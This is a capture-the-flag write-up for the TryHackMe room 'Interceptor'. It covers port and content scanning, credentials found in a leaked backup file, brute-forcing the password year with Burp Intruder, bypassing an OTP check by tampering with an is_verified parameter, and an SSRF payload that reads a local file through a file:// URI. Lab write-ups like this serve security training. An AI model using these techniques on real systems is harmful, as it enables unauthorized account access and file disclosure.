# [Interceptor](https://tryhackme.com/room/interceptor)

## Use Burp or interception knowledge to modify the traffic and pwn the machine.

# Challenge

**MediaHub** appears to be a normal internal portal used by journalists to manage content. Everything seems protected behind a login and verification system, but the real story lies in how the application communicates with its backend APIs.

Your task is to assume the role of an attacker and closely observe traffic between the browser and the server. Using your proxy skills, intercept the requests, analyse how the application processes them, and experiment with modifying the data being sent.

If you understand the flow well enough, a small change in the request might be all it takes to bypass the intended controls. Fire up your proxy, intercept the traffic, and see if you can manipulate the requests to take control of the system.

### What is the flag value after logging in as admin?

1. Enumerate open ports and services

Start with a full TCP port scan with service/version detection and default scripts:

```bash
nmap -p- -sVC <TARGET_IP>
```

**Results:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 c4:fe:62:4b:f7:ed:3b:cd:6f:7b:28:7b:6f:4c:5b:2d (RSA)
|   256 85:c5:f4:19:db:e0:f8:08:19:6b:37:3e:a0:1f:9d:4d (ECDSA)
|_  256 ca:ec:ee:9e:7b:a8:27:4e:58:f3:da:52:f1:ac:72:d9 (ED25519)
53/tcp open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid:
|_  bind.version: 9.16.1-Ubuntu
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-title: MediaHub
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

2. Enumerate content and hidden files

Run a content discovery scan against the web root, extending the wordlist with common backup/source extensions since developers sometimes leave `.bak` copies behind:

```bash
feroxbuster -u http://<TARGET_IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --status-codes 200 -x php,bak,php.bak
```

**Results**

```
200      GET       53l      181w     1625c http://<TARGET_IP>/style.css
200      GET      144l      231w     2874c http://<TARGET_IP>/login.php
200      GET        1l        5w       55c http://<TARGET_IP>/api_login.php
200      GET       14l       19w      173c http://<TARGET_IP>/assets/styles.css
200      GET        7l     1210w    80599c http://<TARGET_IP>/assets/bootstrap.bundle.min.js
200      GET        1l      243w    12646c http://<TARGET_IP>/assets/core.js
200      GET        6l     2272w   220780c http://<TARGET_IP>/assets/bootstrap.min.css
200      GET     2078l    10308w    98180c http://<TARGET_IP>/assets/bootstrap-icons.css
200      GET      498l     3021w   236461c http://<TARGET_IP>/assets/bootstrap-icons.woff2
200      GET        6l        5w       85c http://<TARGET_IP>/footer.php
200      GET       78l      186w     2038c http://<TARGET_IP>/login.php.bak
200      GET      703l     3756w   321347c http://<TARGET_IP>/assets/bootstrap-icons.woff
200      GET    10993l    45090w   293671c http://<TARGET_IP>/assets/jquery-3.6.3.js
200      GET     1025l     5664w   481678c http://<TARGET_IP>/uploads/avatar_1_79703589010e3b8f.png
200      GET        0l        0w        0c http://<TARGET_IP>/config.php
...
```

3. Read the leaked source for developer notes

```bash
cat login.php.bak
```

**Results:**

```php
<?php
include "header.php";

/*
|--------------------------------------------------------------------------
| Developer Note (temporary)
|--------------------------------------------------------------------------
| Admin test account for staging environment
| Email: admin@mediahub.thm
|
| Password policy reminder:
| Admin password follows company format:
| MediaHub + any year
|
| TODO: remove before production deployment
*/
?>

<div class="row justify-content-center">
  <div class="col-md-5">
    <div class="card p-4">

      <h4 class="mb-3">Login</h4>

      <form id="loginForm">
        <input class="form-control mb-3" name="email" placeholder="Email" required>

        <input class="form-control mb-3" name="password" type="password" placeholder="Password" required>

        <button id="btnLogin" class="btn btn-primary w-100" type="submit">
          Login
        </button>
      </form>

      <div id="msg" class="mt-3"></div>

    </div>
  </div>
</div>

<script>
const form = document.getElementById("loginForm");
const msg  = document.getElementById("msg");
const btn  = document.getElementById("btnLogin");

form.addEventListener("submit", async (e) => {
  e.preventDefault();

  msg.innerHTML = `<div class="text-muted">Signing in...</div>`;
  btn.disabled = true;

  const payload = new FormData(form);

  try {
    const res = await fetch("api_login.php", {
      method: "POST",
      body: payload
    });

    const data = await res.json();

    if (!data.ok) {
      msg.innerHTML = `<div class="alert alert-danger py-2 mb-0">${data.error}</div>`;
      btn.disabled = false;
      return;
    }

    msg.innerHTML = `<div class="alert alert-success py-2 mb-0">${data.message}</div>`;
    setTimeout(() => window.location = data.redirect, 400);

  } catch (err) {
    msg.innerHTML = `<div class="alert alert-danger py-2 mb-0">Something went wrong.</div>`;
    btn.disabled = false;
  }
});
</script>

<?php include "footer.php"; ?>
```

This leaked "temporary" comment is the whole vulnerability: it discloses a valid admin email and a predictable password format. It also shows exactly how the frontend talks to the backend. `fetch()` POST of form-encoded `email`/`password` to `api_login.php`, which replies with JSON containing `ok`, `error`/`message`, and a `redirect` URL on success.

4. Brute-force the year suffix

Since the password is `MediaHub<year>`, the year is the only unknown. Two ways to find it:

- **Manual guessing:** reasonable years to try first are the current year and the one or two before/after it.
- **Burp Intruder:** capture the `POST /api_login.php` request, mark the year portion of the `password` parameter as the payload position, and load a numeric payload list. The correct year is the one where the response contains `"ok":true` instead of an error, or where the response length/status differs from the rest of the batch.

In this case, the working credentials are:

```
Email:    admin@mediahub.thm
Password: MediaHub2026
```

5. Bypass OTP verification via parameter tampering

Log in at `http://<TARGET_IP>/login.php` with the credentials above. The app accepts them but doesn't drop you straight into the dashboard. Instead `data.redirect` points to `http://<TARGET_IP>/otp.php`, a one-time-passcode step. Since we don't have access to the admin's email/OTP source, we can't just read the code but the interesting part is how the client tells the server the OTP was verified.

With your proxy intercepting, submit the OTP form. Inspect the resulting request. It POSTs a body containing a field that represents OTP verification status. Change the submitted field name to `is_verified`:

[SCREEN01]

Because the backend trusts client-supplied state instead of independently validating a server-side OTP record, this convinces it verification succeeded, and it grants access to the dashboard without ever needing the real one-time code. This is a **broken authentication / client-controlled trust boundary** bug. The server should track OTP verification status itself, not accept it as an unauthenticated input from the client.

6. Retrieve the flag

Forward the tampered request and browse to `http://<TARGET_IP>/dashboard.php`. Now logged in as `admin@mediahub.thm`, the first flag is displayed at the top of the dashboard.

[SCREEN02]

---

### What is the value of **/var/www/user.txt**?

1. Abuse the "Import Feed" feature for SSRF -> local file read

On `http://<TARGET_IP>/dashboard.php`, the **Import Feed** function accepts a URL and fetches it server-side. A naive implementation like this usually has a filter that blocks obviously internal targets, so the goal is to find an input that satisfies the filter's pattern-matching but is still parsed by the underlying HTTP/URL-fetching library as something else entirely.

Submitting a crafted value such as: `http://127.0.0; file:///var/www/user.txt`

works here because the validation logic doesn't recognize the truncated/malformed host `127.0.0` followed by a semicolon and a second URL as a blocked pattern. But the actual fetching code still resolves and follows the trailing `file://` URI. The `file://` scheme causes the server to read a local file instead of making an HTTP request, and the app reflects the fetched "feed" content back to the page.

Pointing it at `file:///var/www/user.txt` discloses the second flag directly in the Import Feed output.

[SCREEN03]
